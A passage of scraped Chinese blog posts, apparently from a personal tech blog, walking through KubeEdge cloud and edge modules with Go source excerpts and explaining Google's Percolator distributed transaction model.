messageLayer，除此之外，UpstreamController 还包含了一个 downstream： 123456789// NewUpstreamController create UpstreamController from configfunc NewUpstreamController(dc *DownstreamController) (*UpstreamController, error) { uc := &amp;UpstreamController{ crdClient: keclient.GetCRDClient(), messageLayer: messagelayer.NewContextMessageLayer(), dc: dc, } return uc, nil} upstream 的 Start 方法执行了 uc.dispatchMessage()，uc.updateDeviceStatus() 两个函数： 123456789101112// Start UpstreamControllerfunc (uc *UpstreamController) Start() error { klog.Info(&quot;Start upstream devicecontroller&quot;) uc.deviceStatusChan = make(chan model.Message, config.Config.Buffer.UpdateDeviceStatus) go uc.dispatchMessage() for i := 0; i &lt; int(config.Config.Load.UpdateDeviceStatusWorkers); i++ { go uc.updateDeviceStatus() } return nil} dispatchMessage 函数主要通过 uc.messageLayer.Receive() 收取数据，放入 uc.deviceStatusChan。 updateDeviceStatus 函数循环执行，收取 uc.deviceStatusChan 的 msg，将 msg 反序列化获得 msgTwin，获取 deviceID，device，cacheDevice，deviceStatus，然后将 deviceStatus 上传，最后向 Edge 返回确认 msg。 总结 参考 Kubeedge源码阅读系列–cloudcore.devicecontroller模块","link":"/2022/02/24/KubeEdge-%E4%BA%91%E4%B8%8A%E9%83%A8%E5%88%86-DeviceController-%E7%AE%80%E6%9E%90/"},{"title":"Google Percolator","text":"背景Percolator 事务模型是 Google 内部用于 Web 索引更新的业务提出的分布式事务协议，构建在 BigTable 之上，总体来说就是一个经过优化的二阶段提交的实现。使用基于 Percolator 的增量处理系统代替原有的批处理索引系统后，Google 在处理同样数据量的文档时，将文档的平均搜索延时降低了50%。 2PC传统的 2PC 简单描述一下就是两步： 发起事务：事务管理器会发出 Prepare 请求，要求参与者记录日志，进行资源的检查和锁定 确认/取消事务：当请求得到所有参与者的成功确认后，事务管理器会发出 Commit 请求，执行真正的操作；如果第一步中只要有一个执行者返回失败，则取消事务 这样会有两个问题，一个就是单点故障：如果事务管理器发生故障，数据库会一直阻塞下去。尤其是在第二阶段发生故障的话，所有参与者还都处于锁定事务资源的状态中，从而无法继续完成事务操作；另一个就是存在数据不一致的情况：在第二阶段，当事务管理器向参与者发送 Commit 请求之后，发生了局部网络异常，导致只有部分参与者接收到请求，但是其他参与者未接到请求所以无法提交事务，整个系统就会出现数据不一致性的现象。 Percolator 事务流程Percolator 事务是一个经过优化的 2PC 的实现，进行了一个二级锁的优化，也分为两个阶段：预写（Pre-write）和提交（Commit）。另外，所有启用了 Percolator 事务的表中，每一个 Column Family 都会预先增加两个列，分别是： lock：存储事务过程中的锁信息 write：存储当前行可见（最近一次提交）的版本号 另外，为了简化场景，假设存储用户数据的列只有一个，名为 data。 Pre-write 客户端从 TSO 获取时间戳，记为 start_ts，并向 Percolator Worker 发起 Pre-write 请求。 在该事务包含的所有写操作中选取一个作为主（primary）操作，其余的作为次（secondary）操作。主操作将作为整个事务的互斥点，标记事务的状态。 先预写主操作，成功后再预写次操作。在预写过程中，对每一个写操作都要执行检查： 检查写入的行对应的 lock 列是否有锁，如果有，说明其他事务正在写，直接取消整个事务 检查写入的行对应的 write 列版本号是否晚于 start_ts，如果是，说明有版本冲突，直接取消整个事务 检查通过后，以 start_ts 作为版本号将数据写入 data 列，对操作行加锁，即更新 lock 列的锁信息：主操作行的 lock 直接标为primary，次操作行的 lock 则标为主操作行的键和列名。不更新write列，亦即此时写入的数据仍然不可见。 Commit 客户端从 TSO 获取时间戳，记为 commit_ts，并向 Percolator Worker 发起 Commit 请求。 检查主操作行对应的 lock 列所在的 primary 标记是否存在，如果不存在则失败，取消事务；如果存在则继续。 以 commit_ts 作为版本号，将 start_ts 更新到 write 列中。也就是说在本阶段完成后，预写阶段写入的数据将会可见。 对该行解锁，即删除 lock 列的 primary 信息。 若步骤 1~4 均成功，说明主操作行成功，代表整个事务实际上已经提交。接下来更新每个 secondary 即可，即重复步骤3、4的更新 write 列和清除 lock 列操作。secondary 的 commit 是可以异步进行的，只是在异步提交进行的过程中，如果此时有读请求，可能会需要做一下锁的清理工作。 案例银行转账，Bob 向 Joe 转账 7 元。该事务于 start_ts=7 开始，commit_ts=8 结束，Key 为 Bob 和 Joe 的行可能在不同的分片上。具体过程如下： 首先查询 write 列获取最新时间戳数据，获取到 data@5，然后从 data 列里面获取时间戳为 5 的数据，初始状态下，Bob 的帐户下有 10，Joe 的帐户下有 2。 事务开始，获取 start_ts=7 作为当前事务的开始时间戳，将 Bob 行选为本事务的 primary，通过写入 lock 列锁定 Bob 的帐户，同时将数据 7:$3 写入到 data 列。 同样，使用 start_ts=7，将 Joe 改变后的余额写入到 data 列，当前操作作为 secondary，因此在 lock 列写入 7:Primary@Bob.bal（当失败时，能够快速定位到 primary 操作，并根据其状态异步清理）。 事务带着当前时间戳 commit_ts=8 进入 Commit 阶段：删除 primary 所在的 lock，并在 write 列中写入以提交时间戳作为版本号指向数据存储的一个指针 data@7。至此，读请求过来时将看到 Bob 的余额为 3。 同样，使用 commit_ts=8，依次在 secondary 操作项中写入 write 列并清理锁。 至此，整个当前 Percolator 事务已完成。 对比相比 2PC 存在的问题，来看看 Percolator 事务模型有哪些改进。 单点故障Percolator 通过日志和异步线程的方式弱化了这个问题。一是，Percolator 引入的异步线程可以在事务管理器宕机后，回滚各个分片上的事务，提供了善后手段，不会让分片上被占用的资源无法释放。二是，事务管理器可以用记录日志的方式使自身无状态化，日志通过共识算法同时保存在系统的多个节点上。这样，事务管理器宕机后，可以在其他节点启动新的事务管理器，基于日志恢复事务操作。 数据不一致2PC 的一致性问题主要缘自第二阶段，不能确保事务管理器与多个参与者的通讯始终正常。但在 Percolator 的第二阶段，事务管理器只需要与 primary 操作所在的一个节点通讯，这个 Commit 操作本身就是原子的。所以，事务的状态自然也是原子的，一致性问题被完美解决了。 Snapshot Isolation传统关系型数据库中定义的隔离级别有4种（RU、RC、RR、S），而 Percolator 事务模型提供的隔离级别是快照隔离（Snapshot Isolation, SI），它也是与 MVCC 相辅相成的。SI的优点是： 对于读操作，保证能够从时间戳/版本号指定的稳定快照获取，不会发生幻读 对于写操作，保证在多个事务并发写同一条记录时，最多只有一个会提交成功 如图，基于快照隔离的事务，开始于 start timestamp（图内为小空格），结束于 commit timestamp（图内为小黑球）。本例包含以下信息： txn_2 不能看到 txn_1 的提交信息，因为 txn_2 的开始时间戳 start timestamp 小于 txn_1 的提交时间戳 commit timestamp txn_3 可以看到 txn_2 和 txn_1 的提交信息 txn_1 和 txn_2 并发执行：如果它们对同一条记录进行写入，至少有一个会失败 参考 Peng D, Dabek F, Inc G . “Large-scale Incremental Processing Using Distributed Transactions and Notifications” (2010).","link":"/2021/02/09/Google-Percolator/"},{"title":"KubeEdge 云上部分 EdgeController 简析","text":"本文基于 commit 9a7e140b42abb4bf6bcabada67e3568f73964278。 概述EdgeController 是一个扩展的 k8s 控制器，管理边缘节点和 Pods 的元数据，确保数据能够传递到指定的边缘节点。 模块入口cloud/pkg/edgecontroller/edgecontroller.go： 12345678910// Start controllerfunc (ec *EdgeController) Start() { if err := ec.upstream.Start(); err != nil { klog.Exitf(&quot;start upstream failed with error: %s&quot;, err) } if err := ec.downstream.Start(); err != nil { klog.Exitf(&quot;start downstream failed with error: %s&quot;, err) }} Start 分别启动 upstream 和 downstream，upstream 和 downstream 之间没有依赖关系。注册 EdgeController 时，upstream 和 downstream 就通过 NewUpstreamController 和 NewDownstreamController 初始化好了。 upstream在 NewUpstreamController 中初始化了所有成员 channel，upstream.Start() 主要就是调用 uc.dispatchMessage() 分发收到的消息，以及执行其他函数用于处理成员 channel 里面的数据。 dispatchMessage 函数不断轮询，调用 uc.messageLayer.Receive() 接受消息，根据收到的消息 resourceType 选择将数据送到对应的 channel 中： 1234567891011121314151617181920212223242526272829303132333435363738switch resourceType {case model.ResourceTypeNodeStatus: uc.nodeStatusChan &lt;- msgcase model.ResourceTypePodStatus: uc.podStatusChan &lt;- msgcase model.ResourceTypeConfigmap: uc.configMapChan &lt;- msgcase model.ResourceTypeSecret: uc.secretChan &lt;- msgcase model.ResourceTypeServiceAccountToken: uc.serviceAccountTokenChan &lt;- msgcase common.ResourceTypePersistentVolume: uc.persistentVolumeChan &lt;- msgcase common.ResourceTypePersistentVolumeClaim: uc.persistentVolumeClaimChan &lt;- msgcase common.ResourceTypeVolumeAttachment: uc.volumeAttachmentChan &lt;- msgcase model.ResourceTypeNode: switch msg.GetOperation() { case model.QueryOperation: uc.queryNodeChan &lt;- msg case model.UpdateOperation: uc.updateNodeChan &lt;- msg default: klog.Errorf(&quot;message: %s, operation type: %s unsupported&quot;, msg.GetID(), msg.GetOperation()) }case model.ResourceTypePod: if msg.GetOperation() == model.DeleteOperation { uc.podDeleteChan &lt;- msg } else { klog.Errorf(&quot;message: %s, operation type: %s unsupported&quot;, msg.GetID(), msg.GetOperation()) }case model.ResourceTypeRuleStatus: uc.ruleStatusChan &lt;- msgdefault: klog.Errorf(&quot;message: %s, resource type: %s unsupported&quot;, msg.GetID(), resourceType)} 每种 channel 中的消息都由不同的函数来处理，这里以 updateNodeStatus 函数为例，它接收 nodeStatusChan 中的消息，依次 GetContentData，GetNamespace，GetResourceName，GetOperation，根据消息的 Operation 做出相应的操作, 一般是上传到 apiserver： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155func (uc *UpstreamController) updateNodeStatus() { for { select { case &lt;-beehiveContext.Done(): klog.Warning(&quot;stop updateNodeStatus&quot;) return case msg := &lt;-uc.nodeStatusChan: klog.V(5).Infof(&quot;message: %s, operation is: %s, and resource is %s&quot;, msg.GetID(), msg.GetOperation(), msg.GetResource()) data, err := msg.GetContentData() if err != nil { klog.Warningf(&quot;message: %s process failure, get content data failed with error: %s&quot;, msg.GetID(), err) continue } namespace, err := messagelayer.GetNamespace(msg) if err != nil { klog.Warningf(&quot;message: %s process failure, get namespace failed with error: %s&quot;, msg.GetID(), err) continue } name, err := messagelayer.GetResourceName(msg) if err != nil { klog.Warningf(&quot;message: %s process failure, get resource name failed with error: %s&quot;, msg.GetID(), err) continue } switch msg.GetOperation() { case model.InsertOperation: _, err := uc.kubeClient.CoreV1().Nodes().Get(context.Background(), name, metaV1.GetOptions{}) if err == nil { klog.Infof(&quot;node: %s already exists, do nothing&quot;, name) uc.nodeMsgResponse(name, namespace, common.MessageSuccessfulContent, msg) continue } if !errors.IsNotFound(err) { errLog := fmt.Sprintf(&quot;get node %s info error: %v , register node failed&quot;, name, err) klog.Error(errLog) uc.nodeMsgResponse(name, namespace, errLog, msg) continue } node := &amp;v1.Node{} err = json.Unmarshal(data, node) if err != nil { errLog := fmt.Sprintf(&quot;message: %s process failure, unmarshal marshaled message content with error: %s&quot;, msg.GetID(), err) klog.Error(errLog) uc.nodeMsgResponse(name, namespace, errLog, msg) continue } if _, err = uc.createNode(name, node); err != nil { errLog := fmt.Sprintf(&quot;create node %s error: %v , register node failed&quot;, name, err) klog.Error(errLog) uc.nodeMsgResponse(name, namespace, errLog, msg) continue } uc.nodeMsgResponse(name, namespace, common.MessageSuccessfulContent, msg) case model.UpdateOperation: nodeStatusRequest := &amp;edgeapi.NodeStatusRequest{} err := json.Unmarshal(data, nodeStatusRequest) if err != nil { klog.Warningf(&quot;message: %s process failure, unmarshal marshaled message content with error: %s&quot;, msg.GetID(), err) continue } getNode, err := uc.kubeClient.CoreV1().Nodes().Get(context.Background(), name, metaV1.GetOptions{}) if errors.IsNotFound(err) { klog.Warningf(&quot;message: %s process failure, node %s not found&quot;, msg.GetID(), name) continue } if err != nil { klog.Warningf(&quot;message: %s process failure with error: %s, namespaces: %s name: %s&quot;, msg.GetID(), err, namespace, name) continue } // TODO: comment below for test failure. Needs to decide whether to keep post troubleshoot // In case the status stored at metadata service is outdated, update the heartbeat automatically for i := range nodeStatusRequest.Status.Conditions { if time.Since(nodeStatusRequest.Status.Conditions[i].LastHeartbeatTime.Time) &gt; time.Duration(uc.config.NodeUpdateFrequency)*time.Second { nodeStatusRequest.Status.Conditions[i].LastHeartbeatTime = metaV1.NewTime(time.Now()) } } if getNode.Annotations == nil { getNode.Annotations = make(map[string]string) } for name, v := range nodeStatusRequest.ExtendResources { if name == constants.NvidiaGPUScalarResourceName { var gpuStatus []types.NvidiaGPUStatus for _, er := range v { gpuStatus = append(gpuStatus, types.NvidiaGPUStatus{ID: er.Name, Healthy: true}) } if len(gpuStatus) &gt; 0 { data, _ := json.Marshal(gpuStatus) getNode.Annotations[constants.NvidiaGPUStatusAnnotationKey] = string(data) } } data, err := json.Marshal(v) if err != nil { klog.Warningf(&quot;message: %s process failure, extend resource list marshal with error: %s&quot;, msg.GetID(), err) continue } getNode.Annotations[string(name)] = string(data) } // Keep the same &quot;VolumesAttached&quot; attribute with upstream, // since this value is maintained by kube-controller-manager. nodeStatusRequest.Status.VolumesAttached = getNode.Status.VolumesAttached if getNode.Status.DaemonEndpoints.KubeletEndpoint.Port != 0 { nodeStatusRequest.Status.DaemonEndpoints.KubeletEndpoint.Port = getNode.Status.DaemonEndpoints.KubeletEndpoint.Port } getNode.Status = nodeStatusRequest.Status node, err := uc.kubeClient.CoreV1().Nodes().UpdateStatus(context.Background(), getNode, metaV1.UpdateOptions{}) if err != nil { klog.Warningf(&quot;message: %s process failure, update node failed with error: %s, namespace: %s, name: %s&quot;, msg.GetID(), err, getNode.Namespace, getNode.Name) continue } nodeID, err := messagelayer.GetNodeID(msg) if err != nil { klog.Warningf(&quot;Message: %s process failure, get node id failed with error: %s&quot;, msg.GetID(), err) continue } resource, err := messagelayer.BuildResource(nodeID, namespace, model.ResourceTypeNode, name) if err != nil { klog.Warningf(&quot;Message: %s process failure, build message resource failed with error: %s&quot;, msg.GetID(), err) continue } resMsg := model.NewMessage(msg.GetID()). SetResourceVersion(node.ResourceVersion). FillBody(common.MessageSuccessfulContent). BuildRouter(modules.EdgeControllerModuleName, constants.GroupResource, resource, model.ResponseOperation) if err = uc.messageLayer.Response(*resMsg); err != nil { klog.Warningf(&quot;Message: %s process failure, response failed with error: %s&quot;, msg.GetID(), err) continue } klog.V(4).Infof(&quot;message: %s, update node status successfully, namespace: %s, name: %s&quot;, msg.GetID(), getNode.Namespace, getNode.Name) default: klog.Warningf(&quot;message: %s process failure, node status operation: %s unsupported&quot;, msg.GetID(), msg.GetOperation()) continue } klog.V(4).Infof(&quot;message: %s process successfully&quot;, msg.GetID()) } }} downstreamdownstream 的 Start 函数如下： 12345678910111213141516171819202122func (dc *DownstreamController) Start() error { klog.Info(&quot;start downstream controller&quot;) // pod go dc.syncPod() // configmap go dc.syncConfigMap() // secret go dc.syncSecret() // nodes go dc.syncEdgeNodes() // rule go dc.syncRule() // ruleendpoint go dc.syncRuleEndpoint() return nil} pod 是最小的，管理，创建，计划的最小单元，包含一个或多个容器；configmap 用于保存配置数据的键值对，可以用来保存单个属性，也可以用来保存配置文件，作用是可以将配置文件与镜像文件分离；secret 与 configmap 类似，但是用来存储敏感信息；node 是 pod 真正运行的主机，可以物理机，也可以是虚拟机；ruleEndpoint 定义了消息的来源，或消息的去向。它包含 3 种类型：rest（云上的一个端点，可以是源端点，用于向边缘发送请求；或者是目标端点，从边缘接收消息）、eventbus（可以是源端点，用于向云发送请求；或者是目标端点，从云接收消息）、servicebus（目标端点，接收云端的消息）；rule 定义了消息如何传输，它包含 3 种类型：rest-&gt;eventbus（用户应用调用云上的 rest api 发送消息，最后消息被发送到边缘的 mqttbroker），eventbus-&gt;rest（用户程序向边缘的 mqttbroker 发布消息，最后消息被发送到云上的 rest api），rest-&gt;servicebus（用户程序调用云上的 rest api 发送消息，最后消息被发送到边缘的应用程序）。 syncPod 获取 podManager 中收到的 events，根据 e.Type 分发不同的路由，最后执行dc.messageLayer.Send(*msg) 把数据发送到边缘。 syncConfigMap 获取 configmapManager 中收到的 events，根据 e.Type 设置不同的 operation，最后执行dc.messageLayer.Send(*msg) 把数据发送到边缘。 syncSecret、syncEdgeNodes、syncRule 和 syncRuleEndpoint 函数的流程也类似。 总结 参考 Kubeedge源码阅读系列–cloudcore.edgecontroller模块","link":"/2022/02/24/KubeEdge-%E4%BA%91%E4%B8%8A%E9%83%A8%E5%88%86-EdgeController-%E7%AE%80%E6%9E%90/"},{"title":"KubeEdge 概述","text":"本文基于 commit 9a7e140b42abb4bf6bcabada67e3568f73964278。 KubeEdge 架构图 KubeEdge 总体有两大部分 —— cloudcore 和 edgecore。cloudcore 部分是 k8s api server 与 Edge 部分的桥梁，负责将指令下发到 Edge，同时将 Edge 的状态和事件同步到的 k8s api server；edgecore 部分接受并执行 Cloud 部分下发的指令，管理各种负载，并将 Edge 部分负载的状态和事件同步到 Cloud 部分。 云上部分CloudHub 是一个 Web Socket 服务端，负责监听云端的变化，缓存并发送消息到 EdgeHub。 DeviceController 是一个扩展的 k8s 控制器，管理边缘设备，确保设备信息、设备状态的云边同步。 EdgeController 是一个扩展的 k8s 控制器，管理边缘节点和 Pods 的元数据，确保数据能够传递到指定的边缘节点。 边缘部分EdgeHub 是一个 Web Socket 客户端，负责与边缘计算的云端交互，包括同步云端资源更新、报告边缘主机和设备状态变化到云端等功能。 Edged 是运行在边缘节点的代理（轻量化的 kubelet），用于管理容器化的应用程序。 EventBus 是一个与 MQTT 服务器 (mosquitto) 交互的 MQTT 客户端，为其他组件提供订阅和发布功能。 ServiceBus 是一个运行在边缘的 HTTP 客户端。 DeviceTwin 负责存储设备状态（传感器的值等）并将设备状态同步到云 (DeviceController)，它还为应用程序提供查询接口。 MetaManager 是消息处理器，位于 Edged 和 Edgehub 之间，它负责向轻量级数据库 (SQLite) 持久化/检索元数据。 关键代码cloudcore 代码入口为 Cloud/cmd/cloudcore/cloudcore.go，在 main 函数中调用 NewCloudCoreCommand，通过 registerModules 函数注册 cloudcore 中的功能模块，通过 StartModules 函数启动已注册的 cloudcore 上的功能模块。registerModules 函数如下： 123456789func registerModules(c *v1alpha1.CloudCoreConfig) { cloudhub.Register(c.Modules.CloudHub) edgecontroller.Register(c.Modules.EdgeController) devicecontroller.Register(c.Modules.DeviceController) synccontroller.Register(c.Modules.SyncController) cloudstream.Register(c.Modules.CloudStream, c.CommonConfig) router.Register(c.Modules.Router) dynamiccontroller.Register(c.Modules.DynamicController)} 这 7 个模块都实现了 Module 接口，注册最终会将模块封装后的结构体放入一个 map[string]*ModuleInfo 类型的全局变量 modules 中。之后 StartModules 函数通过 for 循环从 modules 获取每一个的模块，每个模块分配一个协程调用 Start 函数启动。 edgecore 代码入口为 edge/cmd/edgecore/edgecore.go，在 main 函数中调用 NewEdgeCoreCommand。和在 cloudcore 类似，在 NewEdgeCoreCommand 函数中，通过 registerModules 函数注册 edgecore 中的功能模块，通过 Run 函数启动已注册的 edgecore 中的功能模块。edgecore 中 registerModules 函数注册的模块如下： 12345678910111213// registerModules register all the modules started in edgecorefunc registerModules(c *v1alpha1.EdgeCoreConfig) { devicetwin.Register(c.Modules.DeviceTwin, c.Modules.Edged.HostnameOverride) edged.Register(c.Modules.Edged) edgehub.Register(c.Modules.EdgeHub, c.Modules.Edged.HostnameOverride) eventbus.Register(c.Modules.EventBus, c.Modules.Edged.HostnameOverride) metamanager.Register(c.Modules.MetaManager) servicebus.Register(c.Modules.ServiceBus) edgestream.Register(c.Modules.EdgeStream, c.Modules.Edged.HostnameOverride, c.Modules.Edged.NodeIP) test.Register(c.Modules.DBTest) // Note: Need to put it to the end, and wait for all models to register before executing dbm.InitDBConfig(c.DataBase.DriverName, c.DataBase.AliasName, c.DataBase.DataSource)} Why KubeEdge为什么用 KubeEdge 而不是 k8s 构建边缘计算平台？ k8s 构建边缘计算平台的主要挑战：①资源有限。边缘设备可能只有几百兆的内存，一个原生 kubelet 都跑不起来。②网络受限。k8s 的 master 和 node 通信是通过 List/Watch 机制，边缘场景下网络可能会断开很长时间，这时候 node 上的 kubelet 一直 re-watch 失败，就会请求 re-list，把 apiserver 上的对象全量拿回去，没法在边缘场景这种受限的网络下很好的工作。③k8s 节点没有自治能力。如何在网络质量不稳定的情况下，对边缘节点实现离线自治，这也是个问题。 KubeEdge 主打三个核心理念，首先是云边协同，边是云的延伸，用户的边可能位于私有网络，因此需要穿透私有网络，通过云来管理私有节点，KubeEdge 默认采用 WebSocket + 消息封装来实现，这样只要边缘网络能访问外网情况下，就能实现双向通信，这就不需要边端需要一个公网的 IP。同时呢，KubeEdge 也优化了原生 Kubernetes 中不必要的一些请求，能够大幅减少通信压力，高时延状态下仍可以工作。 KubeEdge 第二个核心理念是边缘节点自治，做到节点级的元数据的持久化，比如 Pod，ConfigMap 等基础元数据，每个节点都持久化这些元数据，边缘节点离线之后，它仍可以通过本地持久化的元数据来管理应用。在 Kubernetes 中，当 kubelet 重启后， 它首先要向 master 做一次 List 获取全量的数据，然后再进行应用管理工作，如果这时候边和云端的网络断开，就无法获得全量的元数据，也不能进行故障恢复。KubeEdge 做了元数据的持久化后，可以直接从本地获得这些元数据，保证故障恢复的能力，保证服务快速 ready。 另外一个理念是极致轻量，在大多数边缘计算场景下，节点的资源是非常有限的，KubeEdge 采用的方式是重组 kubelet 组件（~10mb 内存占用），优化 runtime 资源消耗。在空载时候，内存占用率很低。 参考 kubeedge源码分析系列之整体架构","link":"/2022/02/23/KubeEdge-%E6%A6%82%E8%BF%B0/"},{"title":"KubeEdge 边缘部分 EdgeHub 简析","text":"本文基于 commit 9a7e140b42abb4bf6bcabada67e3568f73964278。 概述EdgeHub 是一个 Web Socket 客户端，负责与边缘计算的云端交互，包括同步云端资源更新、报告边缘主机和设备状态变化到云端等功能。 模块入口edge/pkg/edgehub/edgehub.go： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960//Start sets context and starts the controllerfunc (eh *EdgeHub) Start() { eh.certManager = certificate.NewCertManager(config.Config.EdgeHub, config.Config.NodeName) eh.certManager.Start() HasTLSTunnelCerts &lt;- true close(HasTLSTunnelCerts) go eh.ifRotationDone() for { select { case &lt;-beehiveContext.Done(): klog.Warning(&quot;EdgeHub stop&quot;) return default: } err := eh.initial() if err != nil { klog.Exitf(&quot;failed to init controller: %v&quot;, err) return } waitTime := time.Duration(config.Config.Heartbeat) * time.Second * 2 err = eh.chClient.Init() if err != nil { klog.Errorf(&quot;connection failed: %v, will reconnect after %s&quot;, err, waitTime.String()) time.Sleep(waitTime) continue } // execute hook func after connect eh.pubConnectInfo(true) go eh.routeToEdge() go eh.routeToCloud() go eh.keepalive() // wait the stop signal // stop authinfo manager/websocket connection &lt;-eh.reconnectChan eh.chClient.UnInit() // execute hook fun after disconnect eh.pubConnectInfo(false) // sleep one period of heartbeat, then try to connect cloud hub again klog.Warningf(&quot;connection is broken, will reconnect after %s&quot;, waitTime.String()) time.Sleep(waitTime) // clean channel clean: for { select { case &lt;-eh.reconnectChan: default: break clean } } }} edgehub 启动主要有以下几步： 设置证书，从 cloudcore 申请证书（若正确配置本地证书，则直接使用本地证书），然后进入循环 调用 eh.initial() 创建 eh.chClient，接着调用 eh.chClient.Init()，初始化过程建立了 websocket/quic 的连接 调用 eh.pubConnectInfo(true)，向 edgecore 各模块广播已经连接成功的消息 go eh.routeToEdge()，执行 eh.chClient.Receive() 接收消息，将从云上部分收到的消息转发给指定边缘部分的模块 (MetaManager/DeviceTwin/EventBus/ServiceBus) go eh.routeToCloud()，执行 beehiveContext.Receive(modules.EdgeHubModuleName) 接收来自边缘 (MetaManager/DeviceTwin/EventBus/ServiceBus) 的信息，并执行 eh.sendToCloud(message) 发到 cloudhub go eh.keepalive()，向 cloudhub 发送心跳信息 另外，当云边消息传送过程中出现错误时，边缘部分会重新 init 相应的 websocket/quic client，与云端重新建立连接。","link":"/2022/02/25/KubeEdge-%E8%BE%B9%E7%BC%98%E9%83%A8%E5%88%86-EdgeHub-%E7%AE%80%E6%9E%90/"},{"title":"KubeEdge 边缘部分 DeviceTwin 简析","text":"本文基于 commit 9a7e140b42abb4bf6bcabada67e3568f73964278。 概述DeviceTwin 负责存储设备状态（传感器的值等）并将设备状态同步到云，它还为应用程序提供查询接口。它由四个子模块组成（membership 模块，communication 模块，device 模块和 device twin 模块）。 DeviceTwin 注册DeviceTwin 注册也调用了 InitDBTable，在 SQLite 数据库中初始化了三张表 Device，DeviceAttr 与 DeviceTwin： 12345678910111213141516171819202122232425262728293031323334353637//Device the struct of devicetype Device struct { ID string `orm:&quot;column(id); size(64); pk&quot;` Name string `orm:&quot;column(name); null; type(text)&quot;` Description string `orm:&quot;column(description); null; type(text)&quot;` State string `orm:&quot;column(state); null; type(text)&quot;` LastOnline string `orm:&quot;column(last_online); null; type(text)&quot;`}//DeviceAttr the struct of device attributestype DeviceAttr struct { ID int64 `orm:&quot;column(id);size(64);auto;pk&quot;` DeviceID string `orm:&quot;column(deviceid); null; type(text)&quot;` Name string `orm:&quot;column(name);null;type(text)&quot;` Description string `orm:&quot;column(description);null;type(text)&quot;` Value string `orm:&quot;column(value);null;type(text)&quot;` Optional bool `orm:&quot;column(optional);null;type(integer)&quot;` AttrType string `orm:&quot;column(attr_type);null;type(text)&quot;` Metadata string `orm:&quot;column(metadata);null;type(text)&quot;`}//DeviceTwin the struct of device twintype DeviceTwin struct { ID int64 `orm:&quot;column(id);size(64);auto;pk&quot;` DeviceID string `orm:&quot;column(deviceid); null; type(text)&quot;` Name string `orm:&quot;column(name);null;type(text)&quot;` Description string `orm:&quot;column(description);null;type(text)&quot;` Expected string `orm:&quot;column(expected);null;type(text)&quot;` Actual string `orm:&quot;column(actual);null;type(text)&quot;` ExpectedMeta string `orm:&quot;column(expected_meta);null;type(text)&quot;` ActualMeta string `orm:&quot;column(actual_meta);null;type(text)&quot;` ExpectedVersion string `orm:&quot;column(expected_version);null;type(text)&quot;` ActualVersion string `orm:&quot;column(actual_version);null;type(text)&quot;` Optional bool `orm:&quot;column(optional);null;type(integer)&quot;` AttrType string `orm:&quot;column(attr_type);null;type(text)&quot;` Metadata string `orm:&quot;column(metadata);null;type(text)&quot;`} 模块入口edge/pkg/devicetwin/devicetwin.go： 1234567891011// Start run the modulefunc (dt *DeviceTwin) Start() { dtContexts, _ := dtcontext.InitDTContext() dt.DTContexts = dtContexts err := SyncSqlite(dt.DTContexts) if err != nil { klog.Errorf(&quot;Start DeviceTwin Failed, Sync Sqlite error:%v&quot;, err) return } dt.runDeviceTwin()} 主要就是 SyncSqlite 和 runDeviceTwin SyncSqliteSyncSqlite 最终会执行 SyncDeviceFromSqlite： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748func SyncDeviceFromSqlite(context *dtcontext.DTContext, deviceID string) error { klog.Infof(&quot;Sync device detail info from DB of device %s&quot;, deviceID) _, exist := context.GetDevice(deviceID) if !exist { var deviceMutex sync.Mutex context.DeviceMutex.Store(deviceID, &amp;deviceMutex) } defer context.Unlock(deviceID) context.Lock(deviceID) devices, err := dtclient.QueryDevice(&quot;id&quot;, deviceID) if err != nil { klog.Errorf(&quot;query device failed: %v&quot;, err) return err } if len(*devices) &lt;= 0 { return errors.New(&quot;Not found device from db&quot;) } device := (*devices)[0] deviceAttr, err := dtclient.QueryDeviceAttr(&quot;deviceid&quot;, deviceID) if err != nil { klog.Errorf(&quot;query device attr failed: %v&quot;, err) return err } attributes := make([]dtclient.DeviceAttr, 0) attributes = append(attributes, *deviceAttr...) deviceTwin, err := dtclient.QueryDeviceTwin(&quot;deviceid&quot;, deviceID) if err != nil { klog.Errorf(&quot;query device twin failed: %v&quot;, err) return err } twins := make([]dtclient.DeviceTwin, 0) twins = append(twins, *deviceTwin...) context.DeviceList.Store(deviceID, &amp;dttype.Device{ ID: deviceID, Name: device.Name, Description: device.Description, State: device.State, LastOnline: device.LastOnline, Attributes: dttype.DeviceAttrToMsgAttr(attributes), Twin: dttype.DeviceTwinToMsgTwin(twins)}) return nil} 这段函数主要执行了以下操作： 检查设备是否在上下文中（设备列表存储在上下文中），如果不在则添加一个 deviceMutex 至上下文中 从数据库中查询设备 从数据库中查询设备属性 从数据库中查询 Device Twin 将设备、设备属性和 Device Twin 数据合并为一个结构，并将其存储在上下文中 runDeviceTwin1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950func (dt *DeviceTwin) runDeviceTwin() { moduleNames := []string{dtcommon.MemModule, dtcommon.TwinModule, dtcommon.DeviceModule, dtcommon.CommModule} for _, v := range moduleNames { dt.RegisterDTModule(v) go dt.DTModules[v].Start() } go func() { for { select { case &lt;-beehiveContext.Done(): klog.Warning(&quot;Stop DeviceTwin ModulesContext Receive loop&quot;) return default: } if msg, ok := beehiveContext.Receive(&quot;twin&quot;); ok == nil { klog.Info(&quot;DeviceTwin receive msg&quot;) err := dt.distributeMsg(msg) if err != nil { klog.Warningf(&quot;distributeMsg failed: %v&quot;, err) } } } }() for { select { case &lt;-time.After((time.Duration)(60) * time.Second): //range to check whether has bug for dtmName := range dt.DTModules { health, ok := dt.DTContexts.ModulesHealth.Load(dtmName) if ok { now := time.Now().Unix() if now-health.(int64) &gt; 60*2 { klog.Infof(&quot;%s health %v is old, and begin restart&quot;, dtmName, health) go dt.DTModules[dtmName].Start() } } } for _, v := range dt.HeartBeatToModule { v &lt;- &quot;ping&quot; } case &lt;-beehiveContext.Done(): for _, v := range dt.HeartBeatToModule { v &lt;- &quot;stop&quot; } klog.Warning(&quot;Stop DeviceTwin ModulesHealth load loop&quot;) return } }} runDeviceTwin 主要执行了以下操作： 启动 devicetwin 中四个的子模块，子模块代码在 edge/pkg/devicetwin/dtmanager 下 轮询接收消息，执行 distributeMsg。将收到的消息发送给 communication 模块，对消息进行分类，即消息是来自 EventBus、EdgeManager 还是 EdgeHub，并填充 ActionModuleMap，再将消息发送至对应的子模块 